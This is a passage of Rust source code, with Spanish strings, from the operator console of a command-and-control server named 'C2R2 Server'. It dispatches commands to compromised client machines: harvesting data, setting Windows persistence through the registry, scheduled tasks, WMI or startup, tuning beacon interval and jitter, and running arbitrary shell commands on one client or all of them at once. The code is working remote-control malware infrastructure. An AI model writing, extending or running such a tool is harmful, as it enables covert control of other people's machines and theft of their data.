                            // Enviar comando de harvest
                            if let Err(e) = client.tx.send("__HARVEST__".to_string()) {
                                error!("[{}] Error enviando comando __HARVEST__: {}", id, e);
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                            }
                        } else {
                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/persist" => {
                    if parts.len() < 2 {
                        println!("{} /persist <method>", "❌ Uso:".bright_red());
                        println!("   Métodos: registry, task, wmi, startup");
                        continue;
                    }
                    
                    let method = parts[1];
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            info!("[{}] Comando /persist: método {}", id, method);
                            
                            println!();
                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_magenta());
                            println!("{}", format!("║        📌 ESTABLECIENDO PERSISTENCIA [{}]", id).bright_magenta().bold());
                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_magenta());
                            println!();
                            println!("{}", format!("  🎯 Método: {}", method).bright_yellow());
                            println!("{}", "  ⏳ Esperando confirmación...".bright_white().dimmed());
                            println!();
                            
                            let persist_cmd = format!("__PERSIST__:{}", method);
                            if let Err(e) = client.tx.send(persist_cmd) {
                                error!("[{}] Error enviando comando __PERSIST__: {}", id, e);
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                            }
                        } else {
                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/persist_remove" => {
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            info!("[{}] Comando /persist_remove: Removiendo persistencia", id);
                            
                            println!();
                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_yellow());
                            println!("{}", format!("║          🧹 REMOVIENDO PERSISTENCIA [{}]", id).bright_yellow().bold());
                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_yellow());
                            println!();
                            println!("{}", "  ⏳ Limpiando...".bright_white().dimmed());
                            println!();
                            
                            if let Err(e) = client.tx.send("__PERSIST_REMOVE__".to_string()) {
                                error!("[{}] Error enviando comando __PERSIST_REMOVE__: {}", id, e);
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                            }
                        } else {
                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/beacon" => {
                    if parts.len() < 2 {
                        println!("{} /beacon <interval:jitter>", "❌ Uso:".bright_red());
                        println!("   Ejemplo: /beacon 60:30  (60 segundos con ±30% jitter)");
                        continue;
                    }
                    
                    let config = parts[1];
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            info!("[{}] Comando /beacon: configuración {}", id, config);
                            
                            println!();
                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_blue());
                            println!("{}", format!("║        📡 CONFIGURANDO BEACON [{}]", id).bright_blue().bold());
                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_blue());
                            println!();
                            println!("{}", format!("  🎯 Config: {}", config).bright_yellow());
                            println!("{}", "  ℹ️  Se aplicará en la próxima reconexión".bright_white().dimmed());
                            println!();
                            
                            let beacon_cmd = format!("__BEACON__:{}", config);
                            if let Err(e) = client.tx.send(beacon_cmd) {
                                error!("[{}] Error enviando comando __BEACON__: {}", id, e);
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                            }
                        } else {
                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/cmd" => {
                    if parts.len() < 2 {
                        println!("{} /cmd <comando>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    let command = parts[1..].join(" ");
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            if let Err(e) = client.tx.send(command.clone()) {
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                            } else {
                                println!("{} {} → {}", 
                                    "📤".bright_blue(), 
                                    format!("[{}]", id).bright_cyan().bold(), 
                                    command.bright_white()
                                );
                            }
                        } else {
                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/cmd_all" => {
                    if parts.len() < 2 {
                        println!("{} /cmd_all <comando>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    let command = parts[1..].join(" ");
                    let clients = clients.lock().unwrap();
                    
                    info!("Comando /cmd_all: {} (a {} clientes)", command, clients.len());
                    
                    if clients.is_empty() {
                        println!("{}", "❌ No hay clientes conectados".bright_red());
                    } else {
                        let mut count = 0;
                        for (id, client) in clients.iter() {
                            if client.tx.send(command.clone()).is_ok() {
                                println!("{} {} → {}", 
                                    "�".bright_magenta(), 
                                    format!("[{}]", id).bright_cyan().bold(), 
                                    command.bright_white().dimmed()
                                );
                                count += 1;
                            }
                        }
                        println!("{} Enviado a {} cliente(s)", "✅".bright_green(), count.to_string().bright_cyan().bold());
                    }
                }
                "/exit" | "/quit" => {
                    println!();
                    println!("{}", "👋 Cerrando C2R2 Server...".bright_yellow().bold());
                    println!();
                    info!("═══════════════════════════════════════════════════════════");
                    info!("Server cerrado por comando /exit del operador");
                    info!("═══════════════════════════════════════════════════════════");
                    // Guardar historial antes de salir
                    let _ = rl.save_history(history_file);
                    std::process::exit(0);
                }
                _ => {
                    println!("{} Comando '{}' desconocido. Usa {}", 
                        "❌".bright_red(), 
                        parts[0].bright_yellow(), 
                        "/help".bright_cyan()
                    );
                }
            }
            },
            Err(ReadlineError::Interrupted) => {
                // Ctrl+C presionado
                println!();
                println!("{}", "👋 Cerrando C2R2 Server... (Ctrl+C)".bright_yellow().bold());
                info!("═══════════════════════════════════════════════════════════");
                info!("Server cerrado por Ctrl+C del operador");
                info!("═══════════════════════════════════════════════════════════");
                let _ = rl.save_history(history_file);
                std::process::exit(0);
            },
            Err(ReadlineError::Eof) => {
                // Ctrl+D presionado
                println!();
                println!("{}", "👋 Cerrando C2R2 Server... (Ctrl+D)".bright_yellow().bold());
                info!("═══════════════════════════════════════════════════════════");
                info!("Server cerrado por Ctrl+D del operador");
                info!("═══════════════════════════════════════════════════════════");
                let _ = rl.save_history(history_file);
                std::process::exit(0);
            },
            Err(err) => {
                eprintln!("{} Error: {:?}", "❌".bright_red(), err);
                break;
            }
        }
    }
    
    // Mantener guard vivo hasta el final (necesario para flush de logs)
    drop(guard);
}
